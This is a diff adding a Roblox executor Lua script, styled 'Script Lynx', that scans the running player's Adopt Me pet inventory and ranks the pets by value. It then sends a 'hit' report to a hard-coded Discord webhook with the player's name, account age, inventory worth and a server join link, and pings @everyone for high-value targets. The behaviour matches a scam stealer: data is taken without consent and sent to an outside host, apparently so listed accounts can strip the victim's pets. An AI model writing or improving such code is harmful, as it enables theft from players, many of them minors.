@@ -1,0 +1,127 @@
+-- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱ - OMNIPOTENT HASHED PESOS ]] --
+
+-- [[ BOT GENERATED CONFIG ]] --
+local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"}
+local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local THRESHOLD = 0.13 
+
+-- 1. INITIALIZATION & SERVICES
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- 2. BLOCKLIST (Jerboa Fix)
+local BLACKLIST = {
+    ["jiggly_jerboa"] = true,
+    ["starter_egg"] = true,
+    ["dog"] = true,
+    ["cat"] = true,
+    ["practice_dog"] = true
+}
+
+-- 3. ACCURATE PESO VALUATION (Neon/Ride Fix)
+local function getFinalValue(base, props)
+    local val = base or 0.8 -- Base lift for accuracy
+    if props.mega_neon or props.mega then val = val * 16
+    elseif props.neon then val = val * 4 end
+    if props.flyable then val = val + 1.2 end
+    if props.rideable then val = val + 1.2 end
+    return val * 56 -- Proper Peso conversion
+end
+
+local function getPetEmoji(props)
+    if props.mega_neon or props.mega then return "Ⓜ️" 
+    elseif props.neon then return "⭐" 
+    elseif props.flyable then return "🪽" 
+    elseif props.rideable then return "🏇" 
+    end
+    return "🐾"
+end
+
+-- 4. INVENTORY SCAN & HIGHEST-TO-LOWEST SORTING
+local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
+local InventoryDB = Fsys("InventoryDB")
+local ClientData = Fsys("ClientData")
+
+local function processInventory()
+    local inv = ClientData.get("inventory")
+    local rawPets = inv.pets or {}
+    local groups = {}
+    local total = 0
+
+    for uid, pet in pairs(rawPets) do
+        local petData = InventoryDB.pets[pet.id]
+        if petData and not BLACKLIST[pet.id] then
+            local props = pet.properties or {}
+            local finalVal = getFinalValue(petData.rvalue or 0.5, props)
+
+            if finalVal >= THRESHOLD then
+                total = total + finalVal
+                local key = pet.id .. (props.neon and "N" or "") .. (props.mega and "M" or "")
+                
+                if not groups[key] then
+                    groups[key] = {
+                        name = petData.name,
+                        count = 1,
+                        totalVal = finalVal,
+                        unitVal = finalVal,
+                        emoji = getPetEmoji(props),
+                        rarity = string.lower(petData.rarity or "common")
+                    }
+                else
+                    groups[key].count = groups[key].count + 1
+                    groups[key].totalVal = groups[key].totalVal + finalVal
+                end
+            end
+        end
+    end
+
+    local sorted = {}
+    for _, v in pairs(groups) do table.insert(sorted, v) end
+    -- SORTING: HIGHEST VALUE AT TOP
+    table.sort(sorted, function(a, b) return a.unitVal > b.unitVal end)
+
+    return sorted, total
+end
+
+-- 5. WEBHOOK (EXTRAS ADDED BACK)
+local sortedPets, totalValue = processInventory()
+local tier = totalValue >= 1000 and "🔴 HIGH" or totalValue >= 200 and "🟡 MID" or "🟢 LOW"
+
+local function sendHit()
+    local petLines = {}
+    for _, p in ipairs(sortedPets) do
+        table.insert(petLines, p.emoji.." "..p.name.." "..p.count.."x (₱"..string.format("%.2f", p.totalVal)..")")
+    end
+
+    local payload = {
+        content = (totalValue >= 500 and "@everyone" or ""),
+        embeds = {{
+            title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ʜɪᴛ ﹒˚₊꒱",
+            description = "```" ..
+                "👤 Name     : "..LocalPlayer.DisplayName.."\n"..
+                "🆔 User     : "..LocalPlayer.Name.."\n"..
+                "📅 Age      : "..LocalPlayer.AccountAge.." Days\n"..
+                "💰 Value    : ₱"..string.format("%.2f", totalValue).."\n"..
+                "📊 Tier     : "..tier.."```",
+            fields = {
+                {name = "🏆 Best Pet", value = "```"..(sortedPets[1] and sortedPets[1].name or "None").."```", inline = true},
+                {name = "🐶 Inventory (AMVGG Pesos)", value = "```" .. table.concat(petLines, "\n") .. "```"},
+                {name = "🌐 Join", value = "[Click to Join](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
+            },
+            color = 0x2F3136,
+            footer = {text = "Omnipotent Lynx | Peso Edition"}
+        }}
+    }
+    
+    local requestFunc = syn and syn.request or http_request or request
+    requestFunc({
+        Url = WEBHOOK,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+if #sortedPets > 0 then sendHit() end
